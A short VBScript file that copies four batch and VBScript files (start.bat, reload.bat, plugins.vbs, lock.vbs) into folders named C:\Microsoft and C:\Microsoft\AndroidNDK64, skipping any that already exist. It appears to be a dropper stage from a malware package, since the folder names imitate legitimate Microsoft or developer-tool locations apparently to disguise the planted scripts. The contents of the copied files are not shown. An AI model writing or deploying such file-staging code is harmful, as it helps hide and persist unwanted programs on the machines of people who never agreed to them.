Option Explicit
DIM fso    
Set fso = CreateObject("Scripting.FileSystemObject")
If (fso.FileExists("C:\Microsoft\start.bat")) Then
	
Else
  	fso.CopyFile "./start.bat", "C:\Microsoft\"
End If

If (fso.FileExists("C:\Microsoft\AndroidNDK64\reload.bat")) Then
		
Else
  	fso.CopyFile "./reload.bat", "C:\Microsoft\AndroidNDK64\"
End If

If (fso.FileExists("C:\Microsoft\plugins.vbs")) Then
		
Else
  	fso.CopyFile "./plugins.vbs", "C:\Microsoft\"
End If

If (fso.FileExists("C:\Microsoft\AndroidNDK64\lock.vbs")) Then
		
Else
  	fso.CopyFile "./lock.vbs", "C:\Microsoft\AndroidNDK64\"
End If
